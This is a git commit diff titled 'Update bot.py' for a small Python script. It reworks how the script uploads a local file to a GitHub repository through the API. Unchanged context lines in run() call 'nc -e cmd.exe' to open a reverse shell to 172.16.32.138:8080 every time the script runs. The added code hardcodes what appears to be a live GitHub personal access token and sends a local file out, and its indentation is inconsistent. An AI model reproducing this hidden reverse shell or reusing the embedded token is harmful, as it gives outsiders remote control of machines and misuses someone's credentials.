9e44462fa2d5ef2991a4b17e43632f60a7ed0fd6
juanangelLerida <79135620+juanangelLerida@users.noreply.github.com>
2023-03-01 20:49:27 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -2,30 +2,30 @@ def run():
   print('hola mundo')
   import os
   os.system('nc -e cmd.exe  172.16.32.138 8080')
-  from github import Github
-g = Github("username", "password")
+  # Import the requests module for send a PUT request
+import requests
+# Import the base64 module for encoding a file to base64
+import base64
 
-repo = g.get_user().get_repo(GITHUB_REPO)
-all_files = []
-contents = repo.get_contents("")
-while contents:
-    file_content = contents.pop(0)
-    if file_content.type == "dir":
-        contents.extend(repo.get_contents(file_content.path))
-    else:
-        file = file_content
-        all_files.append(str(file).replace('ContentFile(path="','').replace('")',''))
+githubAPIURL = "https://api.github.com/repos/juanangelLerida/gitJuan/contents/pruebaJ1"
+# Replace "bracketcounters" with your username, replace "test-repo" with your repository name and replace "new-image.png" with the filename you want to upload from local to GitHub.
 
-with open(r"C:\Users\juanlerrod\Desktop\git\prueba.txt", 'r') as file:
-    content = file.read()
+# Paste your API token here
+githubToken = "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"
 
-# Upload to github
-git_prefix = 'gitJuan/'
-git_file = git_prefix + 'prueba.txt'
-if git_file in all_files:
-    contents = repo.get_contents(git_file)
-    repo.update_file(contents.path, "committing files", content, contents.sha, branch="master")
-    print(git_file + ' UPDATED')
-else:
-    repo.create_file(git_file, "committing files", content, branch="master")
-    print(git_file + ' CREATED')
+
+with open("pruebaJ1", "rb") as f:
+    # Encoding "my-local-image.jpg" to base64 format
+    encodedData = base64.b64encode(f.read())
+
+    headers = {
+        "Authorization": f'''Bearer {githubToken}''',
+        "Content-type": "application/vnd.github+json"
+    }
+    data = {
+        "message": "My commit message", # Put your commit message here.
+        "content": encodedData.decode("utf-8")
+    }
+
+    r = requests.put(githubAPIURL, headers=headers, json=data)
+    print(r.text) # Printing the response
